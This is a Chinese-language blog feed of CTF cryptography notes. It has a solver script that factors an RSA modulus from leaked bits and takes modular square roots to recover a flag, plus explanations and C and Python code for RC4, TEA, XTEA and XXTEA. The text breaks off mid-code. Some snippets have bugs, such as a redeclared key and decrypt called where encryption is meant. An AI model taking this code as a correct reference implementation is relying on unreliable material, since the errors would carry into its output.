<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210917220853630.png" alt="image-20210917220853630"/>

<ul>
<li>第四步以及后面类似</li>
</ul>
<p>所以就需要一个找路径的算法，这里先贴个5space的wp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span>  tqdm</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span>(<span class="params">p0, kbits, n</span>):</span></span><br><span class="line">    <span class="comment"># PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(<span class="number">512</span>-<span class="number">400</span>), beta=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="number">9953949741013869942547068198121837302318253723877106218866850569125612168124953507720549935440414456694849794070623435967826780140286915427474882462420987431026322506726433159619207457167288303630066313113554335142157973136384138957974141794821690882492289219381289736054817877583941375031278015108767863108668566479010711087436814686693513769053008124914798460553425393111487695972525254979562410234110752805380574182432866694020891030485921135474591933136062338390086730078396980498629461268411340424502744686773297853639711048789055056501585346987725433868282476192206326121122527472482411928363635793163788685739</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">14115093155264548284219850276976713894807135646407433952606241177170799620857407025703595509713850915829780548758828322672641152301034211705379026175072611331218908815311430949772272235565783721577000028261320417622996465873828778859895581557742322809089668839711806730037111219021594672886924179920040304097577013490236209729345268062386894230525646920709722753359165796352375582302187897324275077401465001693214034438313030500915688714866020374786738034712789705863769144687851817416283898692607558884892344860918856284384348045176373311592185711275374531053648357885260032561469921168991006893123688018793232724519</span></span><br><span class="line">x = <span class="number">49718812286149241460257842584860093467814450098109752753313290896314226758583527714071510565085142777634579897580985904271580830999001072858071394478220167786258612467372600494251840440664134201847287229508941893691039239231768122659124710796291531043744564781384919249602079669571540916106577516894331515942</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solver</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, n</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.n = n</span><br><span class="line">        self.pq = [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">self, b, p, q</span>):</span></span><br><span class="line">        <span class="comment"># print(bin((p * q) &amp; (2*b-1)))</span></span><br><span class="line">        <span class="comment"># print(bin(n &amp; (2*b-1)))</span></span><br><span class="line">        <span class="keyword">if</span> (p * q) &amp; (<span class="number">2</span>*b-<span class="number">1</span>) == n &amp; (<span class="number">2</span>*b-<span class="number">1</span>):</span><br><span class="line">            self.pq.append((p, q))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> shift <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1024</span>)):</span><br><span class="line">            b = <span class="number">1</span> &lt;&lt; shift</span><br><span class="line">            pq, self.pq = self.pq, []</span><br><span class="line">            <span class="keyword">for</span> p, q <span class="keyword">in</span> pq:</span><br><span class="line">                <span class="keyword">if</span> self.x &amp; b:</span><br><span class="line">                    self.add(b, p | b, q)</span><br><span class="line">                    self.add(b, p, q | b)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.add(b, p, q)</span><br><span class="line">                    self.add(b, p | b, q | b)</span><br><span class="line">        <span class="keyword">return</span> self.pq</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>():</span></span><br><span class="line">    solver = Solver(x,n)</span><br><span class="line">    pqs = solver.solve()</span><br><span class="line">    <span class="keyword">for</span> pq <span class="keyword">in</span> tqdm(pqs):</span><br><span class="line">        p0 = ZZ(pq[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> n % p0 == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> p0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = solve()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> p:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;WTF&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">q = n // p</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span>(<span class="params">s1, s2, k1, k2, w, p</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((s1*k1+s2*k2*w)%p, (s1*k2+s2*k1)%p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Cipolla_algorithm</span>(<span class="params">p, n</span>):</span></span><br><span class="line">    a = randint(<span class="number">1</span>, p)</span><br><span class="line">    w = a ** <span class="number">2</span> - n</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(w, (p-<span class="number">1</span>)/<span class="number">2</span>, p) !=p-<span class="number">1</span> :</span><br><span class="line">        a = randint(<span class="number">1</span>, p)</span><br><span class="line">        w = a ** <span class="number">2</span> - n</span><br><span class="line"></span><br><span class="line">    times = (p+<span class="number">1</span>)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    k1 = <span class="number">1</span></span><br><span class="line">    k2 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    first = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    sum1 = <span class="number">1</span></span><br><span class="line">    sum2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> times != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> first:</span><br><span class="line">            k1, k2=power(k1, k2, a, <span class="number">1</span>, w, p)</span><br><span class="line">            first = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k1, k2=power(k1, k2, k1, k2, w, p)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> times &amp; <span class="number">1</span>:</span><br><span class="line">            sum1, sum2 = power(sum1, sum2, k1, k2, w, p)</span><br><span class="line">        times &gt;&gt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum1</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span>(<span class="params">c, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(n)):</span><br><span class="line">            <span class="keyword">assert</span> gcd(n[i], n[j]) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(c) == <span class="built_in">len</span>(n)</span><br><span class="line"></span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> a, b: a*b, n)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(c, n):</span><br><span class="line">        N_i = N/j</span><br><span class="line">        N_i_1 = invert(N_i, j)</span><br><span class="line">        x+=i*N_i*N_i_1</span><br><span class="line">    <span class="keyword">return</span> x % N</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = <span class="number">97789022547681650809933091642056359150836470891445993627949413086016719683911550390348524253338464108135525531721006469788306072638903125487128091084906431304397197863433093408542153418850907879262775592792761229127882079891050206567861588411053522722484920915639103903835446582738792406513866721081609034727</span></span><br><span class="line">    c = <span class="number">604109533640546717288614903413461044854900650125730200042163821752619770507166751125800700503843917800294862970797939065820252304433442778225561669457982600654960975625</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    n = <span class="number">14115093155264548284219850276976713894807135646407433952606241177170799620857407025703595509713850915829780548758828322672641152301034211705379026175072611331218908815311430949772272235565783721577000028261320417622996465873828778859895581557742322809089668839711806730037111219021594672886924179920040304097577013490236209729345268062386894230525646920709722753359165796352375582302187897324275077401465001693214034438313030500915688714866020374786738034712789705863769144687851817416283898692607558884892344860918856284384348045176373311592185711275374531053648357885260032561469921168991006893123688018793232724519</span></span><br><span class="line">    x = <span class="number">49718812286149241460257842584860093467814450098109752753313290896314226758583527714071510565085142777634579897580985904271580830999001072858071394478220167786258612467372600494251840440664134201847287229508941893691039239231768122659124710796291531043744564781384919249602079669571540916106577516894331515942</span></span><br><span class="line">    q = n // p</span><br><span class="line">    get_x1 = Cipolla_algorithm(p, c)</span><br><span class="line">    get_x2 = Cipolla_algorithm(q, c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>  <span class="built_in">pow</span>(get_x1, <span class="number">2</span>, p) == c % p</span><br><span class="line">    <span class="keyword">assert</span>  <span class="built_in">pow</span>(get_x2, <span class="number">2</span>, q) == c % q</span><br><span class="line"></span><br><span class="line">    c11 = get_x1</span><br><span class="line">    c12 = p-get_x1</span><br><span class="line">    c21 = get_x2</span><br><span class="line">    c22 = q-get_x2</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;possible m :&#x27;</span> + long_to_bytes(<span class="built_in">str</span>(CRT([c11, c21], [p, q])))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;possible m :&#x27;</span> + long_to_bytes(<span class="built_in">str</span>(CRT([c11, c22], [p, q])))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;possible m :&#x27;</span> + long_to_bytes(<span class="built_in">str</span>(CRT([c12, c21], [p, q])))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;possible m :&#x27;</span> + long_to_bytes(<span class="built_in">str</span>(CRT([c12, c22], [p, q])))</span><br></pre></td></tr></table></figure>

<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210918092847303.png" alt="image-20210918092847303"></p>
<p>？？？还有别的套娃</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>Stream Cipher</title>
    <url>/posts/542742a9/</url>
    <content><![CDATA[<p>参考</p>
<p><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%B5%81%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2020/11/07/crypto-流密码</a></p>
<p><a href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E5%9E%8B%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95">https://zh.wikipedia.org/wiki/微型加密算法</a></p>
<span id="more"></span>

<h1 id="Stream-Cipher"><a href="#Stream-Cipher" class="headerlink" title="Stream Cipher"></a>Stream Cipher</h1><h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><p>Rivest Cipher 4，RSA的R发明的，存在弱点</p>
<p>RC4 = 伪随机数生成器 + 异或，一个字节一个字节处理</p>
<p>由于异或的性质，解密就是再做一次加密</p>
<ul>
<li>密钥：长度可变，[1,255]</li>
<li>密钥生成一个S盒，加密过程中S盒变化</li>
</ul>
<h3 id="KSA：S盒初始化"><a href="#KSA：S盒初始化" class="headerlink" title="KSA：S盒初始化"></a>KSA：S盒初始化</h3><p>初始化长度为256的S盒</p>
<ul>
<li><p>先将0到255的互不重复的元素装入S盒</p>
</li>
<li><p>根据密钥打乱S盒</p>
</li>
</ul>
<h3 id="PRGA：加密"><a href="#PRGA：加密" class="headerlink" title="PRGA：加密"></a>PRGA：加密</h3><p>一边加密明文，一边变换S盒，保证没256次循环S盒中的每一个元素都被交换过一次</p>
<p>简易的算法如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S = [_ <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span>	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">	j = (j + S[i] + Key[i]) % N</span><br><span class="line">	S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">	i = (i + <span class="number">1</span>) % N</span><br><span class="line">	j = (j + S[i]) % N</span><br><span class="line">	S[i], S[j] = S[j], S[i]</span><br><span class="line">	t[k] ^= S[(S[i] + S[j]) % N]</span><br></pre></td></tr></table></figure>

<p>C的脚本如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key[] = &#123;<span class="number">78</span>, <span class="number">51</span>, <span class="number">67</span>, <span class="number">84</span>, <span class="number">70</span>, <span class="number">89</span>, <span class="number">69</span>, <span class="number">83</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> text[] = &#123;<span class="number">0xCD</span>, <span class="number">0x53</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x25</span>, <span class="number">0x92</span>, <span class="number">0x04</span>, <span class="number">0x98</span>, <span class="number">0x9B</span>, <span class="number">0x54</span>, <span class="number">0x93</span>, <span class="number">0xEA</span>, <span class="number">0x1D</span>, <span class="number">0x33</span>, <span class="number">0xC4</span>, <span class="number">0x90</span>, <span class="number">0x2D</span>, <span class="number">0x36</span>, <span class="number">0x93</span>, <span class="number">0xB1</span>, <span class="number">0xEC</span>, <span class="number">0x96</span>, <span class="number">0x24</span>, <span class="number">0x55</span>, <span class="number">0xFF</span>, <span class="number">0x18</span>, <span class="number">0xCC</span>, <span class="number">0xA8</span>, <span class="number">0x1C</span>, <span class="number">0x8E</span>, <span class="number">0xE5</span>, <span class="number">0x15</span>, <span class="number">0xAC</span>, <span class="number">0x4D</span>, <span class="number">0xF9</span>, <span class="number">0xBD</span>, <span class="number">0xF2</span>, <span class="number">0x5B</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> key_len = <span class="built_in"><span class="keyword">sizeof</span></span>(key) / <span class="built_in"><span class="keyword">sizeof</span></span>(key[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> text_len = <span class="built_in"><span class="keyword">sizeof</span></span>(text) / <span class="built_in"><span class="keyword">sizeof</span></span>(text[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief KSA</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> j1 = <span class="number">0</span>, s[<span class="number">256</span>] = &#123;&#125;, tmp;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> _ = <span class="number">0</span>; _ &lt; <span class="number">256</span>; ++_)</span><br><span class="line">    &#123;</span><br><span class="line">        s[_] = _;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> _ = <span class="number">0</span>; _ &lt; <span class="number">256</span>; ++_)</span><br><span class="line">    &#123;</span><br><span class="line">        j1 = (j1 + s[_] + key[_ % key_len]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[_], s[_] = s[j1], s[j1] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @brief PRGA</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j2 = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> _ = <span class="number">0</span>; _ &lt; text_len; ++_)</span><br><span class="line">    &#123;</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        j2 = (j2 + s[i]) % <span class="number">256</span>;</span><br><span class="line">        tmp = s[i], s[i] = s[j2], s[j2] = tmp;</span><br><span class="line">        t = (s[i] + s[j2]) % <span class="number">256</span>;</span><br><span class="line">        text[_] ^= s[t];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> _ = <span class="number">0</span>; _ &lt; text_len; _++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, text[_]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h2><p>之前比赛的做到，过一遍就会了</p>
<ul>
<li><a href="https://4xwi11.github.io/posts/493b5ffc/">https://4xwi11.github.io/posts/493b5ffc/</a></li>
</ul>
<h2 id="MTP"><a href="#MTP" class="headerlink" title="MTP"></a>MTP</h2><h2 id="TEA-XTEA-XXTEA"><a href="#TEA-XTEA-XXTEA" class="headerlink" title="TEA / XTEA / XXTEA"></a>TEA / XTEA / XXTEA</h2><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><p><img data-src="https://upload.wikimedia.org/wikipedia/commons/a/a1/TEA_InfoBox_Diagram.png" alt="TEA InfoBox Diagram.png"></p>
<p>之前做过的题</p>
<ul>
<li><a href="https://4xwi11.github.io/posts/90da693a/">https://4xwi11.github.io/posts/90da693a/</a></li>
</ul>
<p>加密函数和解密脚本</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, i;           <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;                       <span class="comment">/* basic cycle start */</span></span><br><span class="line">        sum += delta;</span><br><span class="line">        v0 += ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        v1 += ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);  </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span> <span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i;  <span class="comment">/* set up */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> delta=<span class="number">0x9e3779b9</span>;                     <span class="comment">/* a key schedule constant */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> k0=k[<span class="number">0</span>], k1=k[<span class="number">1</span>], k2=k[<span class="number">2</span>], k3=k[<span class="number">3</span>];   <span class="comment">/* cache key */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++) &#123;                         <span class="comment">/* basic cycle start */</span></span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;                                   </span><br><span class="line">    &#125;                                              <span class="comment">/* end cycle */</span></span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// decode</span></span><br><span class="line">    <span class="keyword">uint32_t</span> en[<span class="number">10</span>] = &#123;</span><br><span class="line">        <span class="number">0x28974004</span>, <span class="number">0xAAD86C7C</span>, <span class="number">0x8D085185</span>, <span class="number">0xD4399568</span>, <span class="number">0xA1BBCC5E</span>, <span class="number">0x645DC758</span>, <span class="number">0xD18027A9</span>, <span class="number">0x12A59394</span>, </span><br><span class="line">        <span class="number">0xEE77B33C</span>, <span class="number">0x22B51132</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        decrypt(en + i, k);</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, en);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// scanf ====&gt; encode</span></span><br><span class="line">    <span class="keyword">char</span> v[<span class="number">40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> k[<span class="number">4</span>] = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> &#125;;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i += <span class="number">2</span>)</span><br><span class="line">			decrypt((<span class="keyword">unsigned</span> <span class="keyword">int</span>*)en + i, k);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(en);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h3><p>TEA的升级版，其实是一种分组密码</p>
<p><img data-src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/XTEA_InfoBox_Diagram.svg/300px-XTEA_InfoBox_Diagram.svg.png" alt="XTEA InfoBox Diagram.svg"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* take 64 bits of data in v[0] and v[1] and 128 bits of key[0] - key[3] */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], sum=<span class="number">0</span>, delta=<span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0=v[<span class="number">0</span>], v1=v[<span class="number">1</span>], delta=<span class="number">0x9E3779B9</span>, sum=delta*num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>]=v0; v[<span class="number">1</span>]=v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h3><p>同理，也是分组密码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span 